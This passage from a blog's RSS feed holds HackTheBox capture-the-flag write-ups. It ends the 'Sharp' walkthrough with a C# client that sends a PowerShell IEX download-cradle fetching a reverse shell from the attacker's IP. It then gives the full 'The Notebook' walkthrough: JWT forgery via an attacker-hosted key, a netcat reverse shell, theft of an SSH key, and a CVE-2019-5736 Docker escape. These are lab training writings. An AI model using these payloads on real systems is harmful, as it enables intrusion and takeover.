+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;namespace&lt;/span&gt; Client {
+
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Client&lt;/span&gt;
+    {
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; Main() {
+            ChannelFactory&amp;lt;IWcfService&amp;gt; channelFactory = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; ChannelFactory&amp;lt;IWcfService&amp;gt;(
+                &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; NetTcpBinding(SecurityMode.Transport),&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;net.tcp://10.10.10.219:8889/wcf/NewSecretWcfEndpoint&amp;#34;&lt;/span&gt;
+            );
+            IWcfService client = channelFactory.CreateChannel();
+            Console.WriteLine(client.InvokePowerShell(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;IEX(New-Object Net.WebClient).downloadString(&amp;#39;10.10.16.3/reverse.ps1&amp;#39;)&amp;#34;&lt;/span&gt;));
+        }
+    }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Re-build the project then execute &lt;code&gt;Client.exe&lt;/code&gt; as &lt;code&gt;lars&lt;/code&gt; gives us our reverse shell as &lt;code&gt;nt-authority system&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-46.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;And the flag is located in &lt;code&gt;C:\Users\Administrator\Desktop\root.txt&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;cd C:\Users\Administrator
+dir
+
+
+    Directory&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; C:\Users\Administrator
+
+
+Mode                LastWriteTime         Length Name                                                                   
+----                -------------         ------ ----                                                                   
+d-r---       11/12/2020   5&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;15 PM                3D Objects                                                             
+d-r---       11/12/2020   5&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;15 PM                Contacts                                                               
+d-r---       11/15/2020   1&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;42 PM                Desktop                                                                
+d-r---       11/15/2020   1&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;46 PM                Documents                                                              
+d-r---       11/12/2020   5&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;15 PM                Downloads                                                              
+d-r---       11/12/2020   5&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;15 PM                Favorites                                                              
+d-r---       11/12/2020   5&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;15 PM                Links                                                                  
+d-r---       11/12/2020   5&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;15 PM                Music                                                                  
+d-r---       11/12/2020   5&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;15 PM                Pictures                                                               
+d-r---       11/12/2020   5&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;15 PM                Saved Games                                                            
+d-r---       11/12/2020   5&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;15 PM                Searches                                                               
+d-r---       11/12/2020   5&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;15 PM                Videos                                                                 
+
+
+cd Desktop
+dir
+
+
+    Directory&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name                                                                   
+----                -------------         ------ ----                                                                   
+-ar---        5/14/2021   6&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;02 AM             34 root.txt                                                               
+
+
+cat root.txt
+&lt;span style=&#34;color:#66d9ef&#34;&gt;[REDACTED]&lt;/span&gt;
+PS C:\Users\Administrator\Desktop&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;footnotes&#34;&gt;Footnotes&lt;/h2&gt;
+&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
+&lt;p&gt;See more about PowerShell one-liner: &lt;a href=&#34;https://gist.github.com/m8r0wn/b6654989035af20a1cb777b61fbc29bf&#34;&gt;https://gist.github.com/m8r0wn/b6654989035af20a1cb777b61fbc29bf&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:2&#34; role=&#34;doc-endnote&#34;&gt;
+&lt;p&gt;Proof of Concept&amp;#160;&lt;a href=&#34;#fnref:2&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:3&#34; role=&#34;doc-endnote&#34;&gt;
+&lt;p&gt;Virtual Machine&amp;#160;&lt;a href=&#34;#fnref:3&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/section&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>HackTheBox: The Notebook</title>
+      <link>/posts/htb-thenotebook/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/htb-thenotebook/</guid>
+      <description>Welcome back to our usual HackTheBox journey, for today medium rated target - The Notebook. In this blog post, we&amp;rsquo;ve managed to alter client-side JWT cookie, spawn our reverse shell then proceeded to achieve user&amp;rsquo;s SSH credentials and, subsequently, be able to privesc via a docker PoC.
+Enumeration The very initial step is to do a network scan using everyone&amp;rsquo;s favorite utility - nmap.
+┌──(kali㉿kali)-[~/HackTheBox/Boxes/TheNotebook] └─$ sudo nmap -sV -sC -sS 10.</description>
+      <content>&lt;p&gt;Welcome back to our usual HackTheBox journey, for today medium rated target - The Notebook. In this blog post, we&amp;rsquo;ve managed to alter client-side JWT cookie, spawn our reverse shell then proceeded to achieve user&amp;rsquo;s SSH credentials and, subsequently, be able to privesc via a docker PoC.&lt;/p&gt;
+&lt;h2 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h2&gt;
+&lt;p&gt;The very initial step is to do a network scan using everyone&amp;rsquo;s favorite utility - &lt;em&gt;nmap&lt;/em&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/HackTheBox/Boxes/TheNotebook&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─$ sudo nmap -sV -sC -sS 10.10.10.230 -p- -oA nmap/thenotebook
+Starting Nmap 7.91 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2021-06-05 05:07 EDT
+Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.10.10.230
+Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.034s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|_  &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+80/tcp open  http    nginx 1.14.0 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|_http-server-header: nginx/1.14.0 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|_http-title: The Notebook - Your Note Keeper
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 21.04 seconds
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Nothing much to look at besides their Nginx server running on port &lt;code&gt;80&lt;/code&gt;, let&amp;rsquo;s display it in our browser.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-6-5-HTB-thenotebook/2021-06-05_16-13.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The webpage allows us to register an account and have some notes written.&lt;/p&gt;
+&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
+&lt;h3 id=&#34;jwt-misconfiguration&#34;&gt;JWT misconfiguration&lt;/h3&gt;
+&lt;p&gt;At first I thought it was either RFI/LFI or XSS yet I couldn&amp;rsquo;t find any JavaScript objects to exploit. Later that I noticed there was a JWT&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt; cookie encoded with our basic login information and we want to change the justice flag &lt;code&gt;admin_cap&lt;/code&gt; to &lt;code&gt;True&lt;/code&gt; in order to have a more privileged access.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-6-5-HTB-thenotebook/2021-06-05_16-19.png&#34; alt=&#34;jwt.io&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The token is to be signed and verified with a RSA-256 private key stored on the server local host; therefore we somehow need to find or crack their secret signature though it might take thousands of years to decipher. Luckily, it is not necessary to do any of that since we can trick the server into signing tokens using our own private key. This is feasible due to the server failed to check for the integrity of its token issuers/authorities.&lt;/p&gt;
+&lt;p&gt;Now, we need to create a new empty passphrase RSA256 private key (&lt;code&gt;privKey.key&lt;/code&gt;) then start a HTTP server on port &lt;code&gt;7070&lt;/code&gt; to host it.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-6-5-HTB-thenotebook/2021-06-05_16-37.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Change &lt;code&gt;kid&lt;/code&gt; and &lt;code&gt;admin_cap&lt;/code&gt; parameter correspondingly to our private key and &lt;code&gt;True&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-6-5-HTB-thenotebook/2021-06-05_16-41.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Here is our JWT cookie:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xMDo3MDcwL3ByaXZLZXkua2V5In0.eyJ1c2VybmFtZSI6ImxlZ2lhaHV5eSIsImVtYWlsIjoibGVnaWFodXl5QGVtYWlsLmNvbSIsImFkbWluX2NhcCI6dHJ1ZX0.EUtQ8LSlpMzKseLGJLVZhKrQoJSbD_BHYhAxuLjvZrKIBGjrzVqxjFnq2OuaBXCkkScsaPvKOBnp_f9LZ5hiRKOPP_N_5E5w2cv1FX_elhEjQe0Y7UWr9BdzWexzzObsaaM_wuF9PR3ydyAc86eg2iI6RXNuWPdv2PYrSsNYWgcF7_Y8QhSMX9nU4UjAQyutziAz-K-Q7eVhQvPubyDYB3cOIl_4Vzw5Jap4W0RvjzrPEQhELHiIO2tcwjqk9_6tZZdaLXYVmn616Ln2WFMXrW1-LaeAPfb5jHBJ1O9r4V35M3tIt7txlimqi116MBmXy4UZUMq0Z0XxLxtO9M070EuzvZwNJea-zZpOBRDMjzxmdDDG-2rOUXuUZDfX2cEGaOgXaudgCAEQZyXTQPGAbND5kf5DMuIKiWTXjokwYeqyOFXLNNmFFYWT1MY-ajEUOorG4WMhVDAZFBzGtJ_Wz75UxOeUl-jYqGyHL99BEwK_ysZtIeLnMoQ1DQcz9CRdcwZymZACk049RAp__SDzzM25tc8TlNzkyuUM0jV6xYTEJ1RqLJ_S0B2TgOLJ6kBYUjy7NdAj9d222mYkDCdxX9HM1rSJ5OdPPE11VqQFwdc-8kgsxjKvIQfXrkHyOHo8kQ8FwweGJR649ebIPsLJ__vmhJB8dNejsKaB4lRuaK0
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Pass the poisoned cookie to Burp then forward it will let us access to Admin Panel and other notes on the server.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-6-5-HTB-thenotebook/2021-06-05_16-42.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Most of the notes were gibberish and payloads from our XSS stage, although some of them mentioned about PHP files being executed unrestrictedly and a user named &lt;code&gt;noah&lt;/code&gt; kept talking about backups.&lt;/p&gt;
+&lt;p&gt;The Admin Panel allows us to upload anything we want; however, the upload folder (&lt;code&gt;/var/www/html&lt;/code&gt;), and all the contents or objects therein, will be deleted and cleanup after approximately every 5 minutes. Because of that reason, we cannot use our elegant web-based p0wny&lt;sup id=&#34;fnref:2&#34;&gt;&lt;a href=&#34;#fn:2&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;2&lt;/a&gt;&lt;/sup&gt; shell for long and have to use the legacy netcat connection.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-6-5-HTB-thenotebook/2021-06-05_16-48.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;the-legendary-called-backups&#34;&gt;The legendary called &amp;lsquo;backups&amp;rsquo;&lt;/h3&gt;
+&lt;p&gt;Running &lt;a href=&#34;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS&#34;&gt;LinPEAS&lt;/a&gt;  as &lt;code&gt;www-data&lt;/code&gt; also provides us with the location of the aforementioned backups.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-6-5-HTB-thenotebook/2021-06-05_17-15.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Notable ones are &lt;code&gt;home.tar.gz&lt;/code&gt;, &lt;code&gt;passwd.bak&lt;/code&gt; and &lt;code&gt;shadow.bak&lt;/code&gt; yet I find the latter two only contain some unusable hashes. Extracting the &lt;code&gt;home.tar.gz&lt;/code&gt; archive is far more interesting as it has &lt;code&gt;noah&lt;/code&gt;&amp;rsquo;s SSH credentials.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Tar extraction command&lt;/span&gt;
+$ tar xzvf ./var/backups/home.tar.gz -C ./tmp/key
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-6-5-HTB-thenotebook/2021-06-05_21-59.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Download and use &lt;code&gt;id_rsa&lt;/code&gt; from &lt;code&gt;noah&lt;/code&gt;&amp;rsquo;s backups will let us ssh into the server and read his user flag.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-6-5-HTB-thenotebook/2021-06-05_22-04.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h2&gt;
+&lt;p&gt;Let have a glance at what &lt;code&gt;noah&lt;/code&gt; can do.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-6-5-HTB-thenotebook/2021-06-05_22-07.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We can execute &lt;code&gt;/usr/bin/docker exec -it webapp-dev01*&lt;/code&gt; as superuser. You can see that I also ran a &lt;code&gt;sudo --version&lt;/code&gt; since it is a practical point to check &lt;code&gt;sudo&lt;/code&gt; version for low hanging fruit even in these medium boxes just to be certain.&lt;/p&gt;
+&lt;p&gt;And while doing a Google search about docker, we came across CVE-2019-5736, which related to this box situation.&lt;/p&gt;
+&lt;p&gt;Here is a brief information about the vulnerability.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;runc through 1.0-rc6, as used in Docker before 18.09.2 and other products, allows attackers to overwrite the host runc binary (and consequently obtain host root access) by leveraging the ability to execute a command as root within one of these types of containers: (1) a new container with an attacker-controlled image, or (2) an existing container, to which the attacker previously had write access, that can be attached with docker exec. This occurs because of file-descriptor mishandling, related to /proc/self/exe.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5736&#34;&gt;Read more&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Fortunately, we have the PoC of this vulnerability available on GitHub as well.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/Frichetten/CVE-2019-5736-PoC&#34;&gt;https://github.com/Frichetten/CVE-2019-5736-PoC&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Frichetten/CVE-2019-5736-PoC/master/screenshots/example1.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Since today post is not about programming, we will not have any in-depth discussion of how these golang lines are functioning. Basically, the PoC instance running in previously mentioned vulnerable docker then escapes and enables us to execute anything as a root user.&lt;/p&gt;
+&lt;p&gt;So then we just need to clone the repository and edit &lt;code&gt;main.go&lt;/code&gt;&amp;rsquo;s payload to create a privileged shell back to our host machine.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-6-5-HTB-thenotebook/2021-06-05_22-17.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;In case you haven&amp;rsquo;t install golang, run the following lines:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# First, install the package&lt;/span&gt;
+$ sudo apt install -y golang
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# Then add the following to your .bashrc&lt;/span&gt;
+export GOROOT&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/usr/lib/go
+export GOPATH&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$HOME/go
+export PATH&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$GOPATH/bin:$GOROOT/bin:$PATH
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# Reload your .bashrc&lt;/span&gt;
+$ source .bashrc
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# Build our crafted PoC&lt;/span&gt;
+$ go build main.go
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# output saved as $(pwd)/main&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;then send our exploit to the target machine and execute these command:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Open a docker environment&lt;/span&gt;
+$ sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# Run the PoC in docker&lt;/span&gt;
+$ chmod +x ./main &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ./main
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# Outside docker - noah session&lt;/span&gt;
+$ sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;and finally we achieve our &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-6-5-HTB-thenotebook/2021-06-05_22-52.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;footnotes&#34;&gt;Footnotes&lt;/h2&gt;
+&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://jwt.io/introduction&#34;&gt;https://jwt.io/introduction&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:2&#34; role=&#34;doc-endnote&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/flozz/p0wny-shell/blob/master/shell.php&#34;&gt;https://github.com/flozz/p0wny-shell/blob/master/shell.php&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:2&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/section&gt;
+</content>
+    </item>
+    
+  </channel>
+</rss>
